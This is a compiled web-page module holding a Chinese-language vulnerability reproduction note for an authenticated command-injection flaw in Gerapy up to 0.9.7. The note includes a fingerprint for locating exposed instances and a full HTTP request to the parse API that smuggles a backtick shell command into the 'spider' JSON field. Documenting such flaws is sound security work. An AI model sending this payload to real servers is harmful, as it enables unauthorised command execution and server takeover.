import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},r=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Gerapy gerapy/server/core/views.py 中的方法存在任意命令执行，攻击者登录后台后发送特定的请求包即可利用漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Gerapy &lt;= 0.9.7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Gerapy&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241451094.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <code>gerapy/server/core/views.py</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241451220.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造请求包测试命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/project/1/parse HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 18

{&quot;spider&quot;:&quot;;\`id\`&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241452592.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),d=[r];function s(c,l){return a(),i("div",null,d)}const u=e(t,[["render",s],["__file","Gerapy parse 后台远程命令执行漏洞.html.vue"]]);export{u as default};
